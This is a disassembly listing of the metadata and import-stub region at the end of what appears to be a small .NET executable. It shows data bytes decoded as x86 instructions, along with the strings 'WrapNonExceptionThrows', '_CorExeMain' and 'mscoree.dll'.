  4069d3:	07                   	pop    %es
  4069d4:	03 1d 05 12 81 0d    	add    0xd811205,%ebx
  4069da:	08 07                	or     %al,(%edi)
  4069dc:	20 02                	and    %al,(%edx)
  4069de:	1d 05 1d 05 02       	sbb    $0x2051d05,%eax
  4069e3:	04 20                	add    $0x20,%al
  4069e5:	01 01                	add    %eax,(%ecx)
  4069e7:	02 0b                	add    (%ebx),%cl
  4069e9:	07                   	pop    %es
  4069ea:	05 1d 05 12 81       	add    $0x8112051d,%eax
  4069ef:	15 1d 05 0e 0e       	adc    $0xe0e051d,%eax
  4069f4:	06                   	push   %es
  4069f5:	00 00                	add    %al,(%eax)
  4069f7:	1d 12 81 1d 17       	sbb    $0x171d8112,%eax
  4069fc:	07                   	pop    %es
  4069fd:	0a 12                	or     (%edx),%dl
  4069ff:	81 1d 0e 1d 0e 1d 0e 	sbbl   $0x8012080e,0x1d0e1d0e
  406a06:	08 12 80 
  406a09:	ad                   	lods   %ds:(%esi),%eax
  406a0a:	12 28                	adc    (%eax),%ch
  406a0c:	1d 12 81 1d 08       	sbb    $0x81d8112,%eax
  406a11:	1d 0e 05 00 00       	sbb    $0x50e,%eax
  406a16:	12 81 21 05 00 01    	adc    0x1000521(%ecx),%al
  406a1c:	1d 05 0e 06 00       	sbb    $0x60e05,%eax
  406a21:	02 01                	add    (%ecx),%al
  406a23:	0e                   	push   %cs
  406a24:	1d 05 06 20 01       	sbb    $0x1200605,%eax
  406a29:	01 12                	add    %edx,(%edx)
  406a2b:	81 25 03 20 00 02 13 	andl   $0xe0a0713,0x2002003
  406a32:	07 0a 0e 
  406a35:	0e                   	push   %cs
  406a36:	0e                   	push   %cs
  406a37:	0e                   	push   %cs
  406a38:	0e                   	push   %cs
  406a39:	1d 05 12 81 25       	sbb    $0x25811205,%eax
  406a3e:	12 75 12             	adc    0x12(%ebp),%dh
  406a41:	81 25 12 75 06 20 01 	andl   $0x81110101,0x20067512
  406a48:	01 11 81 
  406a4b:	29 07                	sub    %eax,(%edi)
  406a4d:	00 01                	add    %al,(%ecx)
  406a4f:	12 75 12             	adc    0x12(%ebp),%dh
  406a52:	81 25 17 07 0b 0e 0e 	andl   $0xe0e0e0e,0xe0b0717
  406a59:	0e 0e 0e 
  406a5c:	12 81 25 12 75 1d    	adc    0x1d751225(%ecx),%al
  406a62:	05 12 81 2d 12       	add    $0x122d8112,%eax
  406a67:	81 2d 12 81 25 07 00 	subl   $0xe0e0400,0x7258112
  406a6e:	04 0e 0e 
  406a71:	0e                   	push   %cs
  406a72:	0e                   	push   %cs
  406a73:	0e                   	push   %cs
  406a74:	05 20 02 0e 03       	add    $0x30e0220,%eax
  406a79:	03 09                	add    (%ecx),%ecx
  406a7b:	07                   	pop    %es
  406a7c:	05 0e 0e 12 81       	add    $0x81120e0e,%eax
  406a81:	01 0e                	add    %ecx,(%esi)
  406a83:	0e                   	push   %cs
  406a84:	05 00 01 12 75       	add    $0x75120100,%eax
  406a89:	0e                   	push   %cs
  406a8a:	03 07                	add    (%edi),%eax
  406a8c:	01 0e                	add    %ecx,(%esi)
  406a8e:	05 07 03 0e 0e       	add    $0xe0e0307,%eax
  406a93:	0e                   	push   %cs
  406a94:	06                   	push   %es
  406a95:	20 02                	and    %al,(%edx)
  406a97:	12 6d 0e             	adc    0xe(%ebp),%ch
  406a9a:	02 05 20 02 01 0e    	add    0xe010220,%al
  406aa0:	1c 04                	sbb    $0x4,%al
  406aa2:	07                   	pop    %es
  406aa3:	01 12                	add    %edx,(%edx)
  406aa5:	6d                   	insl   (%dx),%es:(%edi)
  406aa6:	0a 07                	or     (%edi),%al
  406aa8:	03 12                	add    (%edx),%edx
  406aaa:	81 1d 1d 12 81 1d 08 	sbbl   $0x2070708,0x1d81121d
  406ab1:	07 07 02 
  406ab4:	12 75 12             	adc    0x12(%ebp),%dh
  406ab7:	81 25 08 b0 3f 5f 7f 	andl   $0xad5117f,0x5f3fb008
  406abe:	11 d5 0a 
  406ac1:	3a 0d 07 06 1d 0e    	cmp    0xe1d0607,%cl
  406ac7:	0e                   	push   %cs
  406ac8:	12 81 31 1d 0e 1d    	adc    0x1d0e1d31(%ecx),%al
  406ace:	0e                   	push   %cs
  406acf:	08 05 15 12 11 01    	or     %al,0x1111215
  406ad5:	0e                   	push   %cs
  406ad6:	05 20 01 01 13       	add    $0x13010120,%eax
  406adb:	00 09                	add    %cl,(%ecx)
  406add:	07                   	pop    %es
  406ade:	02 15 12 11 01 0e    	add    0xe011112,%dl
  406ae4:	1d 0e 03 20 00       	sbb    $0x20030e,%eax
  406ae9:	18 06                	sbb    %al,(%esi)
  406aeb:	20 01                	and    %al,(%ecx)
  406aed:	12 81 3d 0e 05 20    	adc    0x20050e3d(%ecx),%al
  406af3:	02 0e                	add    (%esi),%cl
  406af5:	0e                   	push   %cs
  406af6:	0e                   	push   %cs
  406af7:	04 07                	add    $0x7,%al
  406af9:	01 12                	add    %edx,(%edx)
  406afb:	1d 06 20 01 01       	sbb    $0x1012006,%eax
  406b00:	11 81 49 06 07 02    	adc    %eax,0x2070649(%ecx)
  406b06:	12 45 12             	adc    0x12(%ebp),%al
  406b09:	2c 06                	sub    $0x6,%al
  406b0b:	07                   	pop    %es
  406b0c:	02 12                	add    (%edx),%dl
  406b0e:	45                   	inc    %ebp
  406b0f:	12 30                	adc    (%eax),%dh
  406b11:	08 01                	or     %al,(%ecx)
  406b13:	00 08                	add    %cl,(%eax)
  406b15:	00 00                	add    %al,(%eax)
  406b17:	00 00                	add    %al,(%eax)
  406b19:	00 1e                	add    %bl,(%esi)
  406b1b:	01 00                	add    %eax,(%eax)
  406b1d:	01 00                	add    %eax,(%eax)
  406b1f:	54                   	push   %esp
  406b20:	02 16                	add    (%esi),%dl
  406b22:	57                   	push   %edi
  406b23:	72 61                	jb     0x406b86
  406b25:	70 4e                	jo     0x406b75
  406b27:	6f                   	outsl  %ds:(%esi),(%dx)
  406b28:	6e                   	outsb  %ds:(%esi),(%dx)
  406b29:	45                   	inc    %ebp
  406b2a:	78 63                	js     0x406b8f
  406b2c:	65 70 74             	gs jo  0x406ba3
  406b2f:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  406b36:	77 73                	ja     0x406bab
  406b38:	01 00                	add    %eax,(%eax)
  406b3a:	00 00                	add    %al,(%eax)
  406b3c:	64 6b 00 00          	imul   $0x0,%fs:(%eax),%eax
	...
  406b48:	7e 6b                	jle    0x406bb5
  406b4a:	00 00                	add    %al,(%eax)
  406b4c:	00 20                	add    %ah,(%eax)
	...
  406b62:	00 00                	add    %al,(%eax)
  406b64:	70 6b                	jo     0x406bd1
	...
  406b72:	5f                   	pop    %edi
  406b73:	43                   	inc    %ebx
  406b74:	6f                   	outsl  %ds:(%esi),(%dx)
  406b75:	72 45                	jb     0x406bbc
  406b77:	78 65                	js     0x406bde
  406b79:	4d                   	dec    %ebp
  406b7a:	61                   	popa
  406b7b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  406b82:	72 65                	jb     0x406be9
  406b84:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  406b88:	6c                   	insb   (%dx),%es:(%edi)
  406b89:	00 00                	add    %al,(%eax)
  406b8b:	00 00                	add    %al,(%eax)
  406b8d:	00 ff                	add    %bh,%bh
  406b8f:	25 00 20 40 00       	and    $0x402000,%eax
